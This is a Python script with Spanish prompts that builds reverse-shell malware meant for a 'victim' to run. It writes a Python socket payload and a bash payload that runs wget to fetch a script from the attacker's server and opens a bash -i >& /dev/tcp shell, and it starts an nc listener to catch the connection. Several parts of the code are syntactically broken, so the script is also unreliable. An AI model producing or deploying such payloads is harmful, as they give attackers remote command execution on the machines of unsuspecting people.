import os

path_malware = os.getcwd()+ '/malware_victima/'

def clearScr():
    os.system('clear')

numero = int(input("""
Escoja la opcion que desea 
1: reverse shell Python {.py} /simple/
2: reverse shell Bash {.sh} /command interface/ \033 [0;32m{Recommended} \033 [0m
3: reverse shell Python {.py} /command interface/ \033 [0;32m{Recommended} \033 [0m
>  """))

if numero == 1: 
   ip = input("""
   Introduzca su ip
   
   >  """)

   modify_ip = "\'"+ ip +"\'"
    
   puerto = input("""
   Introduzca un puerto {ejemplo: 4444}
   
   >  """)

   name_malware = input("""
   Nombre del archivo malicioso
   >  """)
   
   os.system('cp autoshell.sh /var/www/html')

   viruspy = "import socket\n"\
             "import subprocess\n"\
             "cliente = socket.socket()\n"\
             "try:\n"\
             "   cliente.connect(("+ modify_ip +","+ puerto +"))\n"\
             "   cliente.send(\"shell > \".encode(\"ascii\"))\n"\
             "   while True:\n"\
             "       comandoBytes=cliente.recv(1024)\n"\
             "       comandoCodificado=comandoBytes.decode(\"ascii\")\n"\
             "       comando=subprocess.Popen(comandoCodificado,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n"\
             "       cliente.send(comando.stdout.read())\n"\
             "       cliente.send(\"shell > \".encode(\"ascii\"))\n"\
             "except:\n"\
             "    print(\"Has salido\")\n"\
             "    pass"


   with open(""+ path_malware +""+ name_malware +".py", "w")as f:
      f.write(viruspy)
   clearScr()
   print("El malware se encuentra en la carpeta {malware}")
   path_malwaree = os.getcwd()+ "/malware_victima/""+ name_malware "
   print("Ruta absoluta malware > "path_malwaree)  

    option_listen = input("""
    Ahora necesita abrir un listener en el puerto escogido para poder conecatarse cuando la victima ejecute el archivo.
   
    Quiere desplegar un listener?  [y/n] 
   
    >  """)

def option_listener_yes(): 
     clearScr()
     print("No cierre esta terminal, cuando la victima habra el archivo se habrá conectado a la maquina remotamente.")
     os.system('nc -nlvp '+ puerto +'') #Poner "&&" y despues comando ejecutar dentro de netcat "&& bash .autoshell.sh"

   
     if option_listen == "y":
         option_listener_yes()


     if option_listen == "Y":
         option_listener_yes()


     else:
        print("""
        Sin listener no puedo conectarme al equipo victima :(
        Puede poner el comando [nc -nlvp PUERTO ESCOGIDO] para abrir un listener.
              """)


if numero == 2:
   ip = input("""
   Introduzca su ip
   
   >  """)
    
   puerto = input("""
   Introduzca un puerto {ejemplo: 4444}
   
   >  """)
   name_malware = input("""
   Nombre del archivo malicioso
   >  """)

   os.system('cp autoshell.sh /var/www/html') 

   virussh = "#!/bin/bash\n"\
             "wget http://"+ ip +"/autoshell.sh\n"\
             "mv autoshell.sh .autoshell.sh\n"\   
             "bash -i >& /dev/tcp/"+ ip +"/"+ puerto +" 0>&1\n"\
             "clear"
             
   with open(""+ path_malware +""+ name_malware +".sh", "w")as f:
      f.write(virussh)
   print("El malware se encuentra en la carpeta {malware}")
   path_malwaree = os.getcwd()+ "/malware_victima/""+ name_malware +"
   print("Ruta absoluta malware > "path_malwaree)  
   
   option_listen = input("""
   Ahora necesita abrir un listener en el puerto escogido para poder conectarse cuando la victima ejecute el archivo.
   
   Quiere desplegar un listener?  [y/n]
   
   >  """)


   if option_listen == "y":
       option_listener_yes()

   if option_listen == "Y":
       option_listener_yes()

   else:
       print("""
       Sin listener no puedo entrar al equipo victima :(
       Puede poner el comando [nc -nlvp PUERTO ESCOGIDO] para abrir un listener.""")

               
if numero == 3:
    os.system('cp autoshell.sh /var/www/html') 
    ip = input("""

    Introduzca su IP

    >  """)

    puerto = input("""

    Introduzca un puerto

    >  """)

    name_malware = input("""

    Introduzca un nombren para el archivo

    >  """)

    os.system('cp plantilla.py '+ name_malware +'.py')
    with open(""+ name_malware +".py", "rt")as f:
      x = f.read()

    with open(""+ name_malware +".py", "wt"")as f:
      x = x.replace("ip", ""+ ip +"")
      x = x.replace("puerto", ""+ puerto +"")
      fin.write(x)
    print("El malware se encuentra en la carpeta {malware}")
    path_malwaree = os.getcwd()+ "/malware_victima/""+ name_malware +"
    print("Ruta absoluta malware > " path_malwaree)  
  
    option_listen = input("""
    Ahora necesita abrir un listener en el puerto escogido para poder conecatarse cuando la victima ejecute el archivo.
   
    Quiere desplegar un listener?  [y/n] 
   
    >  """)
         if option_listen == "y":
            option_listener_yes()


        if option_listen == "Y":
             option_listener_yes()


        else:
            print("""
            
            Sin listener no puedo conectarme al equipo victima :(
            Puede poner el comando [nc -nlvp PUERTO ESCOGIDO] para abrir un listener.
            """)
                 


    

   
   
   
   
   
